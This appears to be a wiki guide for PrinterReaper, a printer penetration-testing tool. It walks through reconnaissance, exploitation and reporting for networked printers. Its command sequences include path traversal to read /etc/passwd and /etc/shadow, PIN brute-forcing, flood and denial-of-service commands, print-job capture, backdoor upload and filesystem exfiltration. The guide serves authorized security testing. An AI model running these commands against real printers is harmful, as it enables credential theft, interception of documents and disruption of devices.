# 🔐 Security Testing Guide

Comprehensive guide for conducting professional security assessments of network printers using PrinterReaper.

---

## 📋 Table of Contents

- [Testing Methodology](#-testing-methodology)
- [Reconnaissance Phase](#-reconnaissance-phase)
- [Vulnerability Assessment](#-vulnerability-assessment)
- [Exploitation Phase](#-exploitation-phase)
- [Post-Exploitation](#-post-exploitation)
- [Reporting](#-reporting)

---

## 🎯 Testing Methodology

### Professional Testing Workflow

```
1. Authorization ✅
   └─> Get written permission
   └─> Define scope
   └─> Set boundaries

2. Reconnaissance 🔍
   └─> Discover printers
   └─> Identify models
   └─> Map network

3. Vulnerability Assessment 🔬
   └─> Test filesystem access
   └─> Check authentication
   └─> Verify path traversal
   └─> Test buffer overflows

4. Exploitation 💥
   └─> Exploit vulnerabilities
   └─> Capture data
   └─> Maintain access

5. Post-Exploitation 📊
   └─> Collect evidence
   └─> Clean up
   └─> Document findings

6. Reporting 📝
   └─> Create professional report
   └─> Provide remediation
   └─> Present findings
```

---

## 🔍 Reconnaissance Phase

### Phase 1.1: Network Discovery

```bash
# Automatic SNMP-based discovery
python3 printer-reaper.py

# Output analysis:
# - Note all discovered printers
# - Record IP addresses
# - Identify models and firmware
# - Check printer status
```

**What to Look For:**
- ✅ Number of printers found
- ✅ Printer models and manufacturers
- ✅ Firmware versions
- ✅ Network configuration
- ✅ Current status (Ready, Sleep, Error)

---

### Phase 1.2: Target Identification

```bash
# Connect to each printer
python3 printer-reaper.py <target> pjl

# Get detailed information
> id
> network
> info config
> variables
> firmware_info
```

**Information to Collect:**
- Device ID and model
- Firmware version
- Network configuration (IP, MAC, Gateway)
- Supported features
- Environment variables
- Page count and uptime

---

### Phase 1.3: Capability Detection

```bash
# Test PJL support (safe mode)
python3 printer-reaper.py --safe <target> pjl

# Check which commands are supported
> help
> info filesys
> variables
```

**Commands to Test:**
- File system commands (ls, upload, download)
- Security features (lock, unlock)
- NVRAM access (nvram dump)
- Network information (network)

---

## 🔬 Vulnerability Assessment

### Test 1: Filesystem Access

**Objective**: Determine if filesystem is accessible

```bash
# Test basic file listing
> ls
> ls /
> ls /etc

# Try common sensitive paths
> ls /etc/passwd
> ls /etc/shadow
> ls /rw/var/sys/passwd
> ls /webServer
```

**Vulnerable if:**
- ✅ Can list directories
- ✅ Can read sensitive files
- ✅ No authentication required
- ✅ No access restrictions

**Risk Level**: 🔴 HIGH

---

### Test 2: Path Traversal

**Objective**: Test for directory traversal vulnerabilities

```bash
# Test traversal patterns
> cd ../../
> ls
> cd ../../../
> ls

# Try volume-based traversal
> ls 0:/../../../etc/passwd
> ls 1:/../../etc/shadow

# Test with download
> download ../../../etc/passwd
> download ../../rw/var/sys/passwd
```

**Vulnerable if:**
- ✅ Can escape filesystem root
- ✅ Can access system files
- ✅ Can read /etc/passwd
- ✅ No path sanitization

**Risk Level**: 🔴 CRITICAL

**CVE Reference**: Similar to CVE-2017-8011 (HP printers)

---

### Test 3: File Write Access

**Objective**: Test if attacker can write files

```bash
# Test write operations
> touch test.txt
> upload test_file.txt
> ls

# Try to overwrite sensitive files
> upload malicious.cfg /etc/config.xml
> copy /etc/passwd /etc/passwd.bak
```

**Vulnerable if:**
- ✅ Can create files
- ✅ Can upload arbitrary files
- ✅ Can overwrite system files
- ✅ No write restrictions

**Risk Level**: 🔴 CRITICAL

---

### Test 4: Authentication Bypass

**Objective**: Test if authentication can be bypassed

```bash
# Test lock functionality
> lock 12345
> unlock 12345

# Test without PIN
> unlock 0

# Try brute force
> unlock_bruteforce
```

**Vulnerable if:**
- ✅ No PIN required
- ✅ Default PIN works (0, 1234, admin)
- ✅ PIN can be brute-forced
- ✅ Lock can be bypassed

**Risk Level**: 🟠 HIGH

---

### Test 5: Information Disclosure

**Objective**: Test what information can be extracted

```bash
# Gather all information
> id
> network
> info config
> variables
> nvram dump
> download /etc/passwd
> download /etc/config.xml
```

**Sensitive Information:**
- ✅ Network credentials
- ✅ WiFi passwords
- ✅ SNMP community strings
- ✅ Email credentials
- ✅ Admin passwords
- ✅ Print job history

**Risk Level**: 🟠 HIGH

---

### Test 6: Buffer Overflow

**Objective**: Test for buffer overflow vulnerabilities

```bash
# Test with increasing sizes
> flood 1000
> flood 10000
> flood 50000
> flood 100000

# Monitor printer behavior
> status
> info status
```

**Vulnerable if:**
- ✅ Printer crashes
- ✅ Printer hangs
- ✅ Printer reboots
- ✅ Error messages displayed

**Risk Level**: 🟠 MEDIUM

---

### Test 7: Denial of Service

**Objective**: Test if printer can be disabled

```bash
# Test various DoS vectors
> disable
> offline "Out of service"
> flood 100000
> dos_display
> dos_jobs
> dos_connections
```

**Vulnerable if:**
- ✅ Printer stops accepting jobs
- ✅ Printer becomes unresponsive
- ✅ Printer requires manual recovery
- ✅ No DoS protection

**Risk Level**: 🟡 MEDIUM

---

### Test 8: Job Capture

**Objective**: Test if print jobs can be intercepted

```bash
# Enable job retention
> hold

# Enable capture mode
> capture

# Send test print job from another computer
# Check if job was captured
```

**Vulnerable if:**
- ✅ Jobs can be held
- ✅ Jobs can be captured
- ✅ No encryption on jobs
- ✅ Captured jobs contain sensitive data

**Risk Level**: 🔴 CRITICAL

---

## 💣 Exploitation Phase

### Exploit 1: Password Extraction

```bash
# Download system files
> download /etc/passwd
> download /etc/shadow
> download /rw/var/sys/passwd

# Dump NVRAM (may contain passwords)
> nvram dump

# Check configuration files
> download /etc/config.xml
> cat /etc/config.xml
```

**Look for:**
- Cleartext passwords
- Hashed passwords
- WiFi credentials
- Email credentials
- SNMP community strings

---

### Exploit 2: Configuration Manipulation

```bash
# Backup original configuration
> backup original_config.bak

# Modify settings
> set TIMEOUT=999
> set DUPLEX=OFF
> display "HACKED"

# Lock printer
> lock 31337

# Restore if needed
> restore original_config.bak
```

---

### Exploit 3: Persistent Backdoor

```bash
# Upload backdoor script
> upload backdoor.ps /webServer/backdoor.ps

# Verify upload
> ls /webServer
> cat /webServer/backdoor.ps

# Test backdoor
> execute @PJL ENTER LANGUAGE=POSTSCRIPT
```

---

### Exploit 4: Data Exfiltration

```bash
# Mirror entire filesystem
> mirror

# Download specific files
> download /etc/passwd
> download /webServer/index.html
> download /var/log/jobs.log

# Export to analysis folder
$ ls -la exfiltrated/
```

---

## 📊 Post-Exploitation

### Evidence Collection

```bash
# Collect all artifacts
> backup final_config.bak
> mirror
> nvram dump
> info config > printer_config.txt
> variables > printer_vars.txt
```

### Cleanup Operations

```bash
# Remove uploaded files
> pjl_delete /tmp/test.txt
> pjl_delete /webServer/backdoor.ps

# Reset display
> display ""

# Unlock if locked
> unlock 0

# Exit cleanly
> exit
```

---

## 📝 Reporting

### Vulnerability Report Template

```markdown
# Printer Security Assessment Report

## Executive Summary
- Printers tested: X
- Vulnerabilities found: Y
- Risk level: HIGH/MEDIUM/LOW

## Findings

### Finding 1: Unauthenticated Filesystem Access
- **Severity**: CRITICAL
- **Description**: Printer allows unrestricted filesystem access
- **Impact**: Sensitive file disclosure, configuration manipulation
- **Evidence**: [screenshots/logs]
- **Remediation**: Enable authentication, restrict filesystem access

### Finding 2: Path Traversal Vulnerability
- **Severity**: HIGH
- **Description**: Directory traversal allows access to system files
- **Impact**: Access to /etc/passwd, configuration files
- **Evidence**: [download logs]
- **Remediation**: Implement path sanitization

## Recommendations
1. Update firmware to latest version
2. Enable authentication
3. Restrict network access
4. Disable PJL if not needed
5. Monitor printer logs
```

---

## 🎯 Testing Checklist

### Pre-Assessment
- [ ] Written authorization obtained
- [ ] Scope defined and agreed
- [ ] Test environment prepared
- [ ] Backup plan in place

### Discovery
- [ ] Network scanned for printers
- [ ] All printers identified
- [ ] Models and firmware documented

### Filesystem Testing
- [ ] Directory listing tested
- [ ] File read access tested
- [ ] File write access tested
- [ ] Path traversal tested

### Authentication Testing
- [ ] Lock mechanism tested
- [ ] PIN bypass attempted
- [ ] Default credentials tested
- [ ] Brute force attempted

### Information Disclosure
- [ ] Configuration dumped
- [ ] NVRAM extracted
- [ ] Network credentials tested
- [ ] Sensitive files downloaded

### Denial of Service
- [ ] Printer disable tested
- [ ] Flood attack tested
- [ ] Display spam tested
- [ ] Connection exhaustion tested

### Post-Exploitation
- [ ] Evidence collected
- [ ] Cleanup performed
- [ ] Original state restored
- [ ] Report documented

---

## 🔍 Advanced Testing Techniques

### Fuzzing Filesystem

```bash
# Automated fuzzing
> fuzz

# Manual fuzzing with custom paths
> ls /../../../../etc/passwd
> download ../../../etc/shadow
> upload test.txt ../../etc/test.txt
```

### SNMP Enumeration

```bash
# From command line (before connecting)
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.43

# Get printer description
snmpget -v1 -c public <target> 1.3.6.1.2.1.25.3.2.1.3.1

# Get interpreter information
snmpget -v1 -c public <target> 1.3.6.1.2.1.43.15.1.1.5.1
```

### Network Traffic Analysis

```bash
# Capture PJL traffic
tcpdump -i eth0 -w printer_traffic.pcap port 9100

# Analyze with Wireshark
wireshark printer_traffic.pcap
```

---

## ⚠️ Legal and Ethical Considerations

### Before Testing

**Required:**
- ✅ Written authorization from device owner
- ✅ Clear scope of testing
- ✅ Defined testing boundaries
- ✅ Incident response plan

**Prohibited:**
- ❌ Testing without permission
- ❌ Accessing production systems
- ❌ Destructive testing without approval
- ❌ Data exfiltration without authorization

### During Testing

**Best Practices:**
- Document everything
- Make regular backups
- Use non-destructive tests first
- Get approval before destructive tests
- Maintain chain of custody for evidence

---

## 📚 Related Resources

- **[Attack Vectors](Attack-Vectors)** - Detailed exploitation techniques
- **[Examples](Examples)** - Real-world testing scenarios
- **[PJL Commands](PJL-Commands)** - Command reference
- **[Troubleshooting](Troubleshooting)** - Common issues

---

<div align="center">

**Security Testing Guide**  
Always test responsibly and with proper authorization

**→ [Next: Attack Vectors](Attack-Vectors)**

</div>

